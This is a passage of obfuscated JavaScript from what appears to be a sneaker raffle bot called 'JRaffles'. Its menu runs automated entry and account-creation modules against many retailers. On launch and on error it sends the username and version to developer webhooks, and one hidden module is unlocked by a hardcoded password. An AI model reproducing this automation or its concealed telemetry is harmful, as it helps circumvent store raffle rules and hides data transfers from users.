        ;
    }
    await _0x516d9b(_0x5a1bfa);
    if (_0x32c040 === ![])
        return console['log']('Closing\x20Browser'), await _0x4d70b1(0xbb8);
    else
        try {
            var _0x69566b = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x5e8391
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x4d5366
                    }
                ]
            }];
            const _0x38522c = { 'embeds': _0x69566b };
            var _0x3c83cc = await _0x39e876(null, null, 'open', ![]);
            const _0x571b9d = { 'openDEVMSG': { 'embeds': [_0x3c83cc] } };
            await _0x19fe15(_0x2c8cd2, _0x571b9d['openDEVMSG']);
            async function _0x1aaae6() {
                _0x1e0e73('JRaffles\x20' + _0x4d5366), console['clear'](), console['log']('Hello\x20' + _0x46bace['cyan']('' + _0x5e8391) + ',\x20Welcome\x20to\x20JRaffles\x20' + _0x4d5366), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0xf042ea = 0x0; _0xf042ea < _0x482e75['length'] - 0x4; _0xf042ea++) {
                    if (_0xf042ea >= 0xa) {
                        console['log']('\x20(' + _0xf042ea + ')\x20[' + _0x482e75[_0xf042ea]['name'] + ']');
                        continue;
                    }
                    if (_0x482e75[_0xf042ea]['name'] === 'Reload\x20Settings' || _0x482e75[_0xf042ea]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0xf042ea + ')\x20\x20[' + _0x482e75[_0xf042ea]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x482e75['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x482e75['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x482e75['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x482e75['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x2469c2();
                if (taskModule > _0x482e75['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x4d70b1(0x3e8), _0x1aaae6();
                if (_0x482e75[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x25afa2(_0x482e75[taskModule]['modules']);
                    var _0x9026d4 = _0x482e75[taskModule]['modules'][taskFunction];
                    console['clear']();
                    try {
                        if (taskFunction == 0x3) {
                            var _0x4d9c35 = await _0x35dc56();
                            await _0x9026d4['function'](_0x9026d4, _0x4d9c35);
                        }
                        if (taskFunction == 0x2) {
                            var _0x4d9c35 = await _0x35dc56(), _0xfed0b5 = await _0x23f1a9(_0x9026d4);
                            _0x35ea91['shuffleTasks'] && await _0x21f522(_0xfed0b5), await _0x9026d4['function'](_0x9026d4, _0xfed0b5, _0x4d9c35);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x4d9c35 = await _0x35dc56(), _0xfed0b5 = await _0x23f1a9(_0x9026d4);
                                _0x35ea91['shuffleTasks'] && await _0x21f522(_0xfed0b5), await _0x9026d4['function'](_0x9026d4, _0xfed0b5, _0x4d9c35);
                            } else {
                                if (taskFunction == 0x1) {
                                    var _0x4d9c35 = await _0x35dc56();
                                    await _0x9026d4['function'](_0x9026d4, _0x4d9c35);
                                }
                            }
                        }
                    } catch (_0x51c7e5) {
                        console['log'](_0x51c7e5), await _0x4d70b1(0x7d0);
                    }
                    return _0x1aaae6();
                }
                if (_0x482e75[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x25afa2(_0x482e75[taskModule]['modules']);
                        var _0x9026d4 = _0x482e75[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x4d9c35 = await _0x35dc56(), _0x5a467b = await _0x23f1a9(_0x9026d4);
                            _0x35ea91['shuffleTasks'] && await _0x21f522(_0x5a467b), await _0x9026d4['function'](_0x9026d4, _0x5a467b, _0x4d9c35);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x4d9c35 = await _0x35dc56(), _0x5a467b = await _0x23f1a9(_0x9026d4);
                                _0x35ea91['shuffleTasks'] && await _0x21f522(_0x5a467b), await _0x9026d4['function'](_0x9026d4, _0x5a467b, _0x4d9c35);
                            }
                        }
                    } catch (_0x3de74f) {
                        console['log'](_0x3de74f), await _0x4d70b1(0xfa0);
                    }
                    return _0x1aaae6();
                }
                if (_0x482e75[taskModule]['name'] == 'Overkill') {
                    try {
                        taskFunction = await _0x25afa2(_0x482e75[taskModule]['modules']);
                        var _0x9026d4 = _0x482e75[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x4d9c35 = await _0x35dc56(), _0x5a467b = await _0x23f1a9(_0x9026d4);
                            _0x35ea91['shuffleTasks'] && await _0x21f522(_0x5a467b), await _0x9026d4['function'](_0x9026d4, _0x5a467b, _0x4d9c35);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x4d9c35 = await _0x35dc56(), _0x5a467b = await _0x23f1a9(_0x9026d4);
                                _0x35ea91['shuffleTasks'] && await _0x21f522(_0x5a467b), await _0x9026d4['function'](_0x9026d4, _0x5a467b, _0x4d9c35);
                            }
                        }
                    } catch (_0x1f0c4b) {
                        console['log'](_0x1f0c4b), await _0x4d70b1(0xfa0);
                    }
                    return _0x1aaae6();
                }
                if (_0x482e75[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x25afa2(_0x482e75[taskModule]['modules']);
                    var _0x9026d4 = _0x482e75[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x4d9c35 = await _0x35dc56();
                        return await _0x9026d4['function'](_0x9026d4, _0x4d9c35), _0x1aaae6();
                    }
                    var _0x4d9c35 = await _0x35dc56(), _0x4093bb = await _0x23f1a9(_0x9026d4);
                    return _0x35ea91['shuffleTasks'] && await _0x21f522(_0x4093bb), await _0x9026d4['function'](_0x9026d4, _0x4093bb, _0x4d9c35), _0x1aaae6();
                }
                if (_0x482e75[taskModule]['name'] == 'OneBlockDown') {
                    taskFunction = await _0x25afa2(_0x482e75[taskModule]['modules']);
                    var _0x9026d4 = _0x482e75[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x4d9c35 = await _0x35dc56(), _0x4093bb = await _0x23f1a9(_0x9026d4);
                    return _0x35ea91['shuffleTasks'] && await _0x21f522(_0x4093bb), await _0x9026d4['function'](_0x9026d4, _0x4093bb, _0x4d9c35), _0x1aaae6();
                }
                if (_0x482e75[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x25afa2(_0x482e75[taskModule]['modules']);
                    var _0x9026d4 = _0x482e75[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x4d9c35 = await _0x35dc56(), _0x4093bb = await _0x23f1a9(_0x9026d4);
                    return _0x35ea91['shuffleTasks'] && await _0x21f522(_0x4093bb), await _0x9026d4['function'](_0x9026d4, _0x4093bb, _0x4d9c35), _0x1aaae6();
                }
                if (_0x482e75[taskModule]['name'] == 'EQL') {
                    taskFunction = await _0x25afa2(_0x482e75[taskModule]['modules']);
                    var _0x9026d4 = _0x482e75[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x4d9c35 = await _0x35dc56(), _0x4093bb = await _0x23f1a9(_0x9026d4);
                    return _0x35ea91['shuffleTasks'] && await _0x21f522(_0x4093bb), await _0x9026d4['function'](_0x9026d4, _0x4093bb, _0x4d9c35), _0x1aaae6();
                } else {
                    if (_0x482e75[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x25afa2(_0x482e75[taskModule]['modules']);
                        var _0x9026d4 = _0x482e75[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x4d9c35 = await _0x35dc56(), _0x45db65 = await _0x23f1a9(_0x9026d4);
                            return _0x35ea91['shuffleTasks'] && await _0x21f522(_0x45db65), await _0x9026d4['function'](_0x9026d4, _0x45db65, _0x4d9c35), _0x1aaae6();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x4d9c35 = await _0x35dc56();
                                return await _0x9026d4['function'](_0x9026d4, null, _0x4d9c35), _0x1aaae6();
                            }
                        }
                        ;
                    } else {
                        if (_0x482e75[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x25afa2(_0x482e75[taskModule]['modules']);
                            var _0x9026d4 = _0x482e75[taskModule]['modules'][taskFunction], _0x4d9c35 = await _0x35dc56(), _0x40b7b1 = await _0x23f1a9(_0x9026d4);
                            return _0x35ea91['shuffleTasks'] && await _0x21f522(_0x40b7b1), await _0x9026d4['function'](_0x9026d4, _0x40b7b1, _0x4d9c35), await _0x4d70b1(0x1388), _0x1aaae6();
                        } else {
                            if (_0x482e75[taskModule]['name'] == 'OQIUM\x20Store') {
                                taskFunction = await _0x25afa2(_0x482e75[taskModule]['modules']);
                                var _0x9026d4 = _0x482e75[taskModule]['modules'][taskFunction];
                                console['clear']();
                                if (taskFunction == 0x0) {
                                    var _0x4d9c35 = await _0x35dc56(), _0x45db65 = await _0x23f1a9(_0x9026d4);
                                    return _0x35ea91['shuffleTasks'] && await _0x21f522(_0x45db65), await _0x9026d4['function'](_0x9026d4, _0x45db65, _0x4d9c35), _0x1aaae6();
                                } else {
                                    if (taskFunction == 0x1) {
                                        var _0x4d9c35 = await _0x35dc56();
                                        return await _0x9026d4['function'](_0x9026d4, null, _0x4d9c35), _0x1aaae6();
                                    }
                                }
                                ;
                            } else {
                                if (_0x482e75[taskModule]['name'] == 'BOUNCEWEAR') {
                                    taskFunction = await _0x25afa2(_0x482e75[taskModule]['modules']);
                                    var _0x9026d4 = _0x482e75[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0)
                                        await bwAcc('https://bouncewear.com/nl/account/register', _0x9026d4);
                                    else {
                                        if (taskFunction == 0x1) {
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x482e75[taskModule]['name'] == 'PATTA') {
                                        taskFunction = await _0x25afa2(_0x482e75[taskModule]['modules']);
                                        var _0x9026d4 = _0x482e75[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0) {
                                            var _0x4d9c35 = await _0x35dc56(), _0xf809f6 = await _0x23f1a9(_0x9026d4);
                                            return _0x35ea91['shuffleTasks'] && await _0x21f522(_0xf809f6), await _0x9026d4['function'](_0x9026d4, _0xf809f6, _0x4d9c35), _0x1aaae6();
                                        } else {
                                            if (taskFunction == 0x1) {
                                                var _0x4d9c35 = await _0x35dc56(), _0xf809f6 = await _0x23f1a9(_0x9026d4);
                                                return _0x35ea91['shuffleTasks'] && await _0x21f522(_0xf809f6), await _0x9026d4['function'](_0x9026d4, _0xf809f6, _0x4d9c35), _0x1aaae6();
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x482e75[taskModule]['name'] == 'SLAM\x20JAM') {
                                            taskFunction = await _0x25afa2(_0x482e75[taskModule]['modules']);
                                            var _0x9026d4 = _0x482e75[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x4d9c35 = await _0x35dc56(), _0x420f9d = await _0x23f1a9(_0x9026d4);
                                                return _0x35ea91['shuffleTasks'] && await _0x21f522(_0x420f9d), await _0x9026d4['function'](_0x9026d4, _0x420f9d, _0x4d9c35), _0x1aaae6();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x4d9c35 = await _0x35dc56(), _0x420f9d = await _0x23f1a9(_0x9026d4);
                                                    return _0x35ea91['shuffleTasks'] && await _0x21f522(_0x420f9d), await _0x9026d4['function'](_0x9026d4, _0x420f9d, _0x4d9c35), _0x1aaae6();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x482e75[taskModule]['name'] == 'KICKZ') {
                                                taskFunction = await _0x25afa2(_0x482e75[taskModule]['modules']);
                                                var _0x9026d4 = _0x482e75[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x4d9c35 = await _0x35dc56(), _0x58fde1 = await _0x23f1a9(_0x9026d4);
                                                    return _0x35ea91['shuffleTasks'] && await _0x21f522(_0x58fde1), await _0x9026d4['function'](_0x9026d4, _0x58fde1, _0x4d9c35), _0x1aaae6();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x4d9c35 = await _0x35dc56(), _0x58fde1 = await _0x23f1a9(_0x9026d4);
                                                        return _0x35ea91['shuffleTasks'] && await _0x21f522(_0x58fde1), await _0x9026d4['function'](_0x9026d4, _0x58fde1, _0x4d9c35), _0x1aaae6();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x482e75[taskModule]['name'] == 'JD') {
                                                    taskFunction = await _0x25afa2(_0x482e75[taskModule]['modules']);
                                                    var _0x9026d4 = _0x482e75[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x4d9c35 = await _0x35dc56(), _0x38359a = await _0x23f1a9(_0x9026d4);
                                                        return _0x35ea91['shuffleTasks'] && await _0x21f522(_0x38359a), await _0x9026d4['function'](_0x9026d4, _0x38359a, _0x4d9c35), _0x1aaae6();
                                                    }
                                                } else {
                                                    if (_0x482e75[taskModule]['name'] == 'Seven\x20Store')
                                                        return console['log']('returning\x20to\x20menu'), await _0x4d70b1(0x3e8), _0x1aaae6();
                                                    else {
                                                        if (_0x482e75[taskModule]['name'] == 'Paypal\x20Verification') {
                                                            var _0xb914b0 = _0x482e75[taskModule]['name'], _0x4d9c35 = await _0x35dc56();
                                                            return await _0x598e5f(_0xb914b0, _0x4d9c35), _0x1aaae6();
                                                        } else {
                                                            if (_0x482e75[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                taskFunction = await _0x25afa2(_0x482e75[taskModule]['modules']);
                                                                var _0x9026d4 = _0x482e75[taskModule]['modules'][taskFunction];
                                                                return await _0x9026d4['function'](_0x9026d4), _0x1aaae6();
                                                            } else {
                                                                if (_0x482e75[taskModule]['name'] == 'Change\x20Settings') {
                                                                    console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                    var _0x459c21 = 0x0;
                                                                    for (const _0x50dd76 in _0x35ea91) {
                                                                        console['log']('(' + _0x459c21 + ')\x20' + _0x50dd76 + '\x20:\x20' + _0x35ea91[_0x50dd76]), _0x459c21++;
                                                                    }
                                                                    console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x459c21 + ')\x20Return\x20to\x20Main\x20Menu');
                                                                    var _0x594ee0 = await _0x292405();
                                                                    if (_0x594ee0 == _0x459c21)
                                                                        return _0x1aaae6();
                                                                    console['clear'];
                                                                    var _0x49f527 = 0x0;
                                                                    for (var _0xb31e0a in _0x35ea91) {
                                                                        if (_0x594ee0 == _0x49f527) {
                                                                            console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0xb31e0a + '\x20:'), _0x35ea91[_0xb31e0a] = await _0x51236b(), _0xf25b74['writeFileSync']('../settings.json', JSON['stringify'](_0x35ea91));
                                                                            break;
                                                                        } else
                                                                            _0x49f527++;
                                                                    }
                                                                    return console['log']('Settings\x20Saved!'), await _0x4d70b1(0xbb8), _0x1aaae6();
                                                                } else {
                                                                    if (_0x482e75[taskModule]['name'] == 'Reload\x20Settings')
                                                                        return console['log']('Reloading\x20settings'), await _0x3e8c88(), _0x1aaae6();
                                                                    else {
                                                                        if (taskModule == 0x45) {
                                                                            _0x482e75[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                            var _0x101960 = await _0x41a8de();
                                                                            _0x101960 == 'ModuleVoorDeBoys' ? (await afewScraper(), await _0x3a117f(), await afewFunction(_0x4db5e9[_0x5dd639], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x4d70b1(0xbb8));
                                                                        } else {
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            try {
                await _0x1aaae6();
            } catch (_0x2c817a) {
                return console['log'](_0x2c817a), _0x1aaae6();
            }
        } catch (_0x3ac050) {
            return console['log'](_0x3ac050), await _0x4d70b1(0x3a98);
        }
}
;
_0x1e0e73('JRaffles\x20' + _0x4d5366), _0x3e8c88();
try {
    _0x5f0c8e();
} catch (_0x1044b1) {
    var _0x10517b = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0x5e8391
            },
            {
                'name': 'Version',
                'value': '' + _0x4d5366
            },
            {
                'name': 'Error',
                'value': '' + _0x1044b1
            }
        ]
    }];
    const _0x49ef3a = { 'embeds': _0x10517b };
    _0x19fe15(_0x556085, _0x49ef3a);
}